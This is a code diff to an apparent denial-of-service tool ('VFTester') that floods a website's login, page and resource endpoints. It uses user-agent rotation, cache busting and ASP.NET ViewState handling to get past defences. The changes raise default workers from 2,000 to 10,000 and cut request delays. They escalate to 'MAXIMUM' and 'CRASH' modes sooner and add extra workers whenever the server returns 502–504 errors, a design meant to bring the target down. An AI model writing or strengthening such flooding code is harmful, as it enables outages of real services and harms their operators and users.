@@ -382,22 +382,18 @@ class ServerHealthMonitor:
         recent = self._health_history[-1] if self._health_history else 1.0
         self.server_dying = (recent < 0.3 and self._timeout_streak > 3) or \
                            (recent < 0.15 and len(self._status_window) > 20)
-        if health < 0.15 or (self._timeout_streak > 8 and avg_health < 0.2):
+        if health < 0.3:
             self.crash_mode_active = True
-            return "MAXIMUM", min(step * 3, max_w - cur)
-        elif health < 0.3:
-            self.crash_mode_active = True
-            return "CRASH", min(int(step * 1.5), max_w - cur)
+            return "MAXIMUM", min(step * 5, max_w - cur)
         elif health < 0.5:
             self.crash_mode_active = True
-            return "PRESSURE", min(step, max_w - cur)
+            return "CRASH", min(step * 3, max_w - cur)
         elif health < 0.65:
-            self.crash_mode_active = False
-            return "PRESSURE", min(int(step * 0.5), max_w - cur)
+            self.crash_mode_active = True
+            return "PRESSURE", min(step * 2, max_w - cur)
         else:
             self.crash_mode_active = False
-            self._pressure_multiplier = max(self._pressure_multiplier * 0.95, 1.0)
-            return "NORMAL", min(step, max_w - cur)
+            return "RAMP", min(step, max_w - cur)
 
     @property
     def health_score(self) -> float:
@@ -463,7 +459,7 @@ class VFTester:
         # ASP.NET specific
         self._viewstate_cache: Dict[str, str] = {}
         self._viewstate_ts: float = 0
-        self._viewstate_ttl: float = 30.0
+        self._viewstate_ttl: float = 10.0
         self._viewstate_lock = asyncio.Lock()
         self.username_field = p.get("login_fields", {}).get("username", "username")
         self.password_field = p.get("login_fields", {}).get("password", "password")
@@ -474,14 +470,14 @@ class VFTester:
 
         # Worker config from profile
         wc = self.attack.get("worker_config", {})
-        self.initial_workers = wc.get("initial_workers", 50)
-        self.max_workers = wc.get("max_workers", 2000)
-        self.step = wc.get("step", 100)
-        self.step_duration = wc.get("step_duration", 5)
+        self.initial_workers = wc.get("initial_workers", 200)
+        self.max_workers = wc.get("max_workers", 10000)
+        self.step = wc.get("step", 300)
+        self.step_duration = wc.get("step_duration", 3)
 
         # Request config
         rc = self.attack.get("request_config", {})
-        self.request_delay_ms = rc.get("delay_between_requests_ms", 10)
+        self.request_delay_ms = rc.get("delay_between_requests_ms", 5)
         self.enable_cache_bust = rc.get("cache_bust", True)
         self.enable_ua_rotation = rc.get("user_agent_rotation", True)
 
@@ -505,11 +501,11 @@ class VFTester:
                         "viewstate_present": False, "technologies": []}
         self.attack = {"recommended_strategy": "GENERIC_FLOOD",
                        "attack_vectors": ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"],
-                       "worker_config": {"initial_workers": 50, "max_workers": 2000,
-                                         "step": 100, "step_duration": 5, "ramp_strategy": "GRADUAL"},
+                       "worker_config": {"initial_workers": 200, "max_workers": 10000,
+                                         "step": 300, "step_duration": 3, "ramp_strategy": "GRADUAL"},
                        "page_targets": [], "resource_targets": [],
                        "waf_strategy": {"detected": False},
-                       "request_config": {"delay_between_requests_ms": 10},
+                       "request_config": {"delay_between_requests_ms": 5},
                        "evasion_config": {"rotate_user_agent": True, "cache_bust": True}}
 
     def stop(self):
@@ -540,7 +536,17 @@ class VFTester:
                 try:
                     async with session.get(self.url, headers=self._base_headers(),
                                            ssl=False, allow_redirects=True) as resp:
-                        html = await resp.text()
+                        # Handle redirect to login page — follow and re-fetch
+                        if resp.status in (301, 302, 303, 307, 308):
+                            redirect_url = resp.headers.get('Location', self.url)
+                            if not redirect_url.startswith('http'):
+                                redirect_url = urljoin(self.url, redirect_url)
+                            async with session.get(redirect_url, headers=self._base_headers(),
+                                                   ssl=False, allow_redirects=True) as resp2:
+                                html = await resp2.text()
+                        else:
+                            html = await resp.text()
+                        # Ensure cookies from the response are captured by the session
                         self._viewstate_cache = extract_form_fields(html)
                         self._viewstate_ts = now
                 except Exception:
@@ -564,7 +570,11 @@ class VFTester:
                           "Origin": self.site_root, "Referer": self.url}
                 async with session.post(self.url, headers=headers, data=form_data,
                                        ssl=False, allow_redirects=False) as resp:
+                    body = await resp.text()
                     elapsed = time.time() - t
+                    # Detect "invalid" in response — force ViewState refresh
+                    if "invalid" in body.lower():
+                        self._viewstate_ts = 0
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                       mode="login", hint=f"Login {resp.status}", url=self.url)
                     await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
@@ -858,6 +868,9 @@ class VFTester:
                                        ssl=False, allow_redirects=False) as resp:
                     body = await resp.text()
                     elapsed = time.time() - t
+                    # Detect "invalid" in response — force ViewState refresh
+                    if "invalid" in body.lower():
+                        self._viewstate_ts = 0
                     vs_size = len(hidden_fields.get('__VIEWSTATE', ''))
                     result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                       mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
@@ -1076,7 +1089,7 @@ class VFTester:
         elif health > 0.4: hc = C.Y
         else: hc = C.R
 
-        mode_colors = {"NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"}
+        mode_colors = {"RAMP": C.G, "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"}
         mc = mode_colors.get(mode, C.W)
         mode_display = f"{mc}{mode}{C.RS}"
 
@@ -1157,8 +1170,8 @@ class VFTester:
         await self.keyboard.start()
 
         connector = aiohttp.TCPConnector(
-            limit=actual_max + 500,
-            force_close=False,
+            limit=actual_max * 2 + 1000,
+            force_close=True,
             enable_cleanup_closed=True,
             ttl_dns_cache=30,
             keepalive_timeout=30,
@@ -1224,7 +1237,19 @@ class VFTester:
                             print(f"\n  {C.R}[CRASH] Server failing — +{new} workers -> {cur:,}{C.RS}")
                         elif mode == "PRESSURE":
                             print(f"\n  {C.Y}[PRESS] Server struggling — +{new} workers -> {cur:,}{C.RS}")
+                        elif mode == "RAMP":
+                            print(f"\n  {C.G}[RAMP] Scaling up — +{new} workers -> {cur:,}{C.RS}")
                         for _ in range(new):
+                            self._spawn_worker(session, all_tasks, vectors, pages, resources)
+
+                # Detect 5xx server errors and add bonus pressure
+                has_5xx = any(code in self.stats.codes for code in (502, 503, 504))
+                if has_5xx:
+                    bonus = min(int(self.step * 0.5), actual_max - cur)
+                    if bonus > 0:
+                        cur += bonus
+                        print(f"\n  {C.BD}{C.R}[5xx DETECTED] Server errors found! Increasing pressure... +{bonus} -> {cur:,}{C.RS}")
+                        for _ in range(bonus):
                             self._spawn_worker(session, all_tasks, vectors, pages, resources)
 
                 self.stats.users = cur
